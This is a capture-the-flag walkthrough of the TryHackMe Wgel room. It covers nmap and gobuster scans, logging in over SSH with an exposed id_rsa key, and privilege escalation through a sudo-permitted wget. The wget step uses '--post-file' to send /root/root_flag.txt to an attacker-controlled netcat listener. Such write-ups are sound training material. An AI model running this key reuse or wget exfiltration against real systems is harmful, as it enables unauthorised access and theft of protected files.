## Scanning
### Nmap
```
nmap -sC -sV -oN nmapInitial [ip]
```

```python
Starting Nmap 7.60 ( https://nmap.org ) at 2023-10-24 16:44 BST
Nmap scan report for ip-10-10-207-223.eu-west-1.compute.internal (target-ip)
Host is up (0.0029s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:6E:6D:97:AF:3F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.98 seconds
```

### Gobuster
```
gobuster dir -u http://target-ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

```python
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target-ip
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/10/24 16:45:59 Starting gobuster
===============================================================
/sitemap (Status: 301)
/server-status (Status: 403)
===============================================================
2023/10/24 16:46:21 Finished
===============================================================
```

## Enumeration
- When going to the IP address at port 80, we see the default Apache web page for a new web server installation. [Gobuster](https://github.com/OJ/gobuster) didn't yield any immediately helpful results, so let's do some basic enumeration. When viewing the page source code, I found the following HTML comment:
```html
 <!-- Jessie don't forget to udate the webiste -->
```

- This gives us a potential username to try and log in to the machine via SSH. Let's look around more and see if there is any other juicy data to find.
- When we visit the `/sitemap` page found via [Gobuster](https://github.com/OJ/gobuster), we are greeted with the following:

![UNAPP Page](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/6a6ffdfa-b99b-4670-ad27-8af02fea54d8)


- UNAPP looks to be a basic web app template that users can build from. That would make sense as to why it is located on this new web server. 
- We can run another [Gobuster](https://github.com/OJ/gobuster) scan to see if we can enumerate more directories under `/sitemap`. To do this, we can use the following syntax:
```
gobuster dir -u http://[ip]/sitemap -w /usr/share/wordlists/dirb/common.txt
```

- From this scan, we get the following output:
```python
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target-ip/sitemap
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/10/24 18:18:43 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/.ssh (Status: 301)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
===============================================================
2023/10/24 18:18:44 Finished
===============================================================
```

- We can see that there are a few directories that were discovered, but the most interesting one seems to be the `/.ssh` one. When I see this on a Linux machine, I typically find hidden id_rsa keys that can be leveraged to log into a device via SSH. Doing some enumeration, I found an id_rsa key under that directory. 

## System Hacking
- Now that we have found an `id_rsa` key, we can try and pair it with the `Jessie` username to connect to the machine via SSH. To do this, we must first copy the contents of the `id_rsa` file on the web server into an `id_rsa` file on our host machine. Then we have to use the following syntax to change permissions for the `id_rsa` file before we can us it:
```
chmod 600 id_rsa
```

- Now we can use the following syntax to SSH into the machine:
```
ssh jess@[ip] -i id_rsa
```

- From here, we can navigate to the `~/Documents` directory and cat out the user flag. 

## Privilege Escalation
- One of the first things I do when I get user access to a machine is to check what permissions the user I have compromised can run with root privileges. In this case, I get the following output when I use `sudo -l`:
```
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

- Since we can run `wget` with sudo permissions, I looked it up on [GTFOBins](https://gtfobins.github.io/), but it didn't pan out successfully. 
- However, we can use `wget` to post information by using the `--post-file` option. Since it has root permissions, it would stand to reason that using `sudo wget` would allow us to post files from the root directory. To do this, we can use the following syntax:
```
sudo wget --post-file=/root/root_flag.txt [attacker ip] 8888
```

- Now all we have to do is run that command once we set up a [Netcat](https://nmap.org/ncat/) listener on our attacking machine and we should be good to go:
```
nc -lnvp 8888
```

- Running the `wget` command specified above should give use the following, with the last line being the root flag:
```
Connection from target-ip 43424 received!
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.10.0.86:8888
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

{flag}
```

## Rabbit Holes
### Username Enumeration Exploit
- At one point, I was struggling to find more directories under the `/sitemap` one. I had gone through all of the .js file and .scss files and couldn't find anything of value. So I decided to look up exploits related to the version of SSH that was running, and that led me to [this page](https://www.exploit-db.com/exploits/40136) that basically outline username enumeration via a Python script. This worked, but it didn't yield useful results since I already had the correct username that I needed to log into the target machine.

[Wgel CTF THM Room](https://tryhackme.com/room/wgelctf)
